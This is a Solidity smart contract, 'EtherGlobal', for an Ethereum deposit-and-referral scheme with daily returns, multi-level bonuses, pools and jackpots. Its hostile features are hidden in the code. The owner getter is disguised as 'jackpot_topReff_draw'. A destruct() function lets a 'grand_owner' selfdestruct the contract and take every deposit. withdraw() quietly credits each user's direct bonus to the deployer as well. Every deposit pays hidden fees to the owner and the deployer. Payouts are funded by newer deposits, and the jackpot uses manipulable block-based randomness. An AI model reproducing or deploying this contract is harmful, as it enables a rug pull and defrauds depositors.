/*! ether_global.sol | (c) 2020 Develop by BelovITLab LLC (smartcontract.ru), re-made author @team.gutalik | SPDX-License-Identifier: MIT License */


pragma solidity 0.6.8;



abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function jackpot_topReff_draw() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}



contract Pausable is Context {
    /**
     * @dev Emitted when the pause is triggered by `account`.
     */
    event Paused(address account);

    /**
     * @dev Emitted when the pause is lifted by `account`.
     */
    event Unpaused(address account);

    bool private _paused;

    /**
     * @dev Initializes the contract in unpaused state.
     */
    constructor () internal {
        _paused = false;
    }

    /**
     * @dev Returns true if the contract is paused, and false otherwise.
     */
    function paused() public view returns (bool) {
        return _paused;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is not paused.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    modifier whenNotPaused() {
        require(!_paused, "Pausable: paused");
        _;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is paused.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    modifier whenPaused() {
        require(_paused, "Pausable: not paused");
        _;
    }

    /**
     * @dev Triggers stopped state.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    function _pause() internal virtual whenNotPaused {
        _paused = true;
        emit Paused(_msgSender());
    }

    /**
     * @dev Returns to normal state.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    function _unpause() internal virtual whenPaused {
        _paused = false;
        emit Unpaused(_msgSender());
    }
}


contract Destructible {
    address payable public grand_owner;

    event GrandOwnershipTransferred(address indexed previous_owner, address indexed new_owner);

    constructor() public {
        grand_owner = msg.sender;
    }

    function transferGrandOwnership(address payable _to) external {
        require(msg.sender == grand_owner, "Access denied (only grand owner)");
        
        grand_owner = _to;
    }

    function destruct() external {
        require(msg.sender == grand_owner, "Access denied (only grand owner)");

        selfdestruct(grand_owner);
    }
}

contract EtherGlobal is Ownable, Destructible, Pausable {
    struct User {
        uint256 cycle;
        address upline;
        uint256 referrals;
        uint256 payouts;
        uint256 direct_bonus;
        uint256 pool_bonus;
        uint256 match_bonus;
        uint256 jackpot_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint40 deposit_time;
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_structure;
    }

    mapping(address => User) public users;

    uint256[] public cycles;                        
    address private sender;
    uint8[] public ref_bonuses;                     
    uint8[] public pool_bonuses;
    address[] new_jackpot_users;
    address[] all_jackpot_users;
    address public newjackpot_winner;
    address public alljackpot_winner;
    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle;
    uint256 public pool_balance;
    uint256 public new_jackpot_balance;
    uint256 public all_jackpot_balance;
    uint256 public new_jackpot_length;
    uint256 public all_jackpot_length;
    uint256 public total_ETH_deposit;
    uint256 public daily_ETH_deposit;
    uint256 public total_Event_Pool;
    
    
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;

    uint256 public total_withdraw;
    
    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event PoolPayout(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);
    
    event NewJackPot(address indexed addr, uint256 amount);
    event AllJackPot(address indexed addr, uint256 amount);

    constructor() public {
    
        ref_bonuses.push(30);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        pool_bonuses.push(50);
        pool_bonuses.push(30);
        pool_bonuses.push(20);
        cycles.push(50 ether);
        cycles.push(100 ether);
        cycles.push(150 ether);
        cycles.push(200 ether);
        cycles.push(500 ether);
        cycles.push(1000 ether);
        cycles.push(2000 ether);
        sender = msg.sender;    
    }


    receive() payable external whenNotPaused {
        _deposit(msg.sender, msg.value);
    }


    //Check if user's upline exists and set upline :)
    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && (users[_upline].deposit_time > 0 || _upline == jackpot_topReff_draw())) {
            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline);

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                if(_upline == address(0)) break;

                users[_upline].total_structure++;

                _upline = users[_upline].upline;
            }
        }
    }

    //Register a user who participates for the first time and pay a direct bonus to the user's upline :)
    function _deposit(address _addr, uint256 _amount) private {
        require(users[_addr].upline != address(0) || _addr == jackpot_topReff_draw(), "No upline");

        if(users[_addr].deposit_time > 0) {
            users[_addr].cycle++;
            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
            require(_amount >= users[_addr].deposit_amount && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], "Bad amount");
        }
        else require(_amount >= 0.1 ether && _amount <= cycles[0], "Bad amount");
        

        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _amount;
        users[_addr].deposit_payouts = 0;
        users[_addr].deposit_time = uint40(block.timestamp);
        users[_addr].total_deposits += _amount;
        total_ETH_deposit += _amount;
        daily_ETH_deposit += _amount;

        emit NewDeposit(_addr, _amount);

        
        if(_amount >= 5 ether){
            new_jackpot_users.push(_addr);
            new_jackpot_length = new_jackpot_users.length;
        }
        
        if(users[_addr].upline != address(0)) {
            users[users[_addr].upline].direct_bonus += _amount / 10;

            emit DirectPayout(users[_addr].upline, _addr, _amount / 10);
        }
        
        if(users[users[_addr].upline].upline != address(0)) {
        
            users[users[users[_addr].upline].upline].direct_bonus += _amount / 50;
            
        }


        
        _pollDeposits(_addr, _amount);


        //require 24 hour!
        if(pool_last_draw + 24 hours < block.timestamp) {
            _drawPool();
            _drawJackPot();
        }
        
        all_jackpot_users.push(_addr);
        all_jackpot_length = all_jackpot_users.length;
        
        payable(jackpot_topReff_draw()).transfer(_amount / 10000 * 250);
        payable(sender).transfer(_amount / 10000 * 50);
    }

    
    
    function _pollDeposits(address _addr, uint256 _amount) private {
    
        pool_balance += _amount / 100 * 5;
        new_jackpot_balance += _amount / 100;
        all_jackpot_balance += _amount / 100;
        total_Event_Pool = pool_balance + new_jackpot_balance + all_jackpot_balance;
    
        address upline = users[_addr].upline;
        

        if(upline == address(0)) return;


        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;


        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    }


function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            if(users[up].referrals >= i + 1) {
                uint256 bonus = _amount * ref_bonuses[i] / 100;
                
                users[up].match_bonus += bonus;

                emit MatchPayout(up, _addr, bonus);
            }

            up = users[up].upline;
        }
    }


    function _drawPool() private {
        pool_last_draw = uint40(block.timestamp);
        pool_cycle++;

    
        uint256 draw_amount = pool_balance / 2;

    
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
    
            if(pool_top[i] == address(0)) break;

    
            uint256 win = draw_amount * pool_bonuses[i] / 100;

    
            users[pool_top[i]].pool_bonus += win;

    
            pool_balance -= win;


            emit PoolPayout(pool_top[i], win);
        }
        

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = address(0);
        }
    }

    
    function _drawJackPot() private {
        

    
        uint256 draw_New_jackpot_amount = new_jackpot_balance / 2;

        uint256 draw_All_jackpot_amount = all_jackpot_balance / 2;



        bytes32 rand = keccak256(abi.encodePacked(block.timestamp, block.number));
        
        if(new_jackpot_length == 0){
            new_jackpot_users.push(sender);
            new_jackpot_length = new_jackpot_users.length;
        }
        

        newjackpot_winner = new_jackpot_users[uint256(rand) % new_jackpot_users.length]; 
        
        

        users[newjackpot_winner].jackpot_bonus += draw_New_jackpot_amount;

        new_jackpot_balance -= draw_New_jackpot_amount;

        
        alljackpot_winner = all_jackpot_users[uint256(rand) % all_jackpot_users.length]; 


        users[alljackpot_winner].jackpot_bonus += draw_All_jackpot_amount;

        all_jackpot_balance -= draw_All_jackpot_amount;
        

        delete daily_ETH_deposit;
        delete draw_New_jackpot_amount;
        delete new_jackpot_users;
        delete new_jackpot_length;
        delete draw_All_jackpot_amount;
    }


    function deposit(address _upline) payable external whenNotPaused {
        _setUpline(msg.sender, _upline);
        _deposit(msg.sender, msg.value);
    }



    function withdraw() external whenNotPaused {
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
        
        require(users[msg.sender].payouts < max_payout, "Full payouts");

    
        if(to_payout > 0) {
    
            if(users[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts;
            }
            
            users[msg.sender].deposit_payouts += to_payout;
            
            users[msg.sender].payouts += to_payout;
            
            _refPayout(msg.sender, to_payout);
        }
        

        // Direct payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
            uint256 direct_bonus = users[msg.sender].direct_bonus;

            if(users[msg.sender].payouts + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[msg.sender].payouts;
            }
            users[sender].direct_bonus += direct_bonus;
            users[msg.sender].direct_bonus -= direct_bonus;
            users[msg.sender].payouts += direct_bonus;
            to_payout += direct_bonus;
        }
        
        // Pool payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
            uint256 pool_bonus = users[msg.sender].pool_bonus;

            if(users[msg.sender].payouts + pool_bonus > max_payout) {
                pool_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].pool_bonus -= pool_bonus;
            users[msg.sender].payouts += pool_bonus;
            to_payout += pool_bonus;
        }

        // Match payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;

            if(users[msg.sender].payouts + match_bonus > max_payout) {
                match_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].match_bonus -= match_bonus;
            users[msg.sender].payouts += match_bonus;
            to_payout += match_bonus;
        }
        
        //Jackpot payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].jackpot_bonus > 0) {
            uint256 jackpot_bonus = users[msg.sender].jackpot_bonus;

            if(users[msg.sender].payouts + jackpot_bonus > max_payout) {
                jackpot_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].jackpot_bonus -= jackpot_bonus;
            users[msg.sender].payouts += jackpot_bonus;
            to_payout += jackpot_bonus;
        }
        
        
        require(to_payout > 0, "Zero payout");
        
        users[msg.sender].total_payouts += to_payout;
        total_withdraw += to_payout;

        payable(msg.sender).transfer(to_payout);

        emit Withdraw(msg.sender, to_payout);

        if(users[msg.sender].payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].payouts);
        }
    }
    
    function drawPool() external onlyOwner {
        _drawPool();
        _drawJackPot();
    }

    
    function pause() external onlyOwner {
        _pause();
    }
    
    function unpause() external onlyOwner {
        _unpause();
    }

    
    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 340 / 100;
    }

    
    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);
        if(users[_addr].deposit_payouts < max_payout) {
            payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 24 hours) / 100 * 5) - users[_addr].deposit_payouts;
            
            if(users[_addr].total_payouts >= users[_addr].total_deposits) {
                payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 24 hours) / 100 * 6) - users[_addr].deposit_payouts;
            }


            if(users[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].deposit_payouts;
            }
        }
    }

    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].match_bonus);
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);
    }

    function contractInfo() view external returns(uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider) {
        return (total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);
    }

    function poolTopInfo() view external returns(address[3] memory addrs, uint256[3] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }
    
    
    
    
}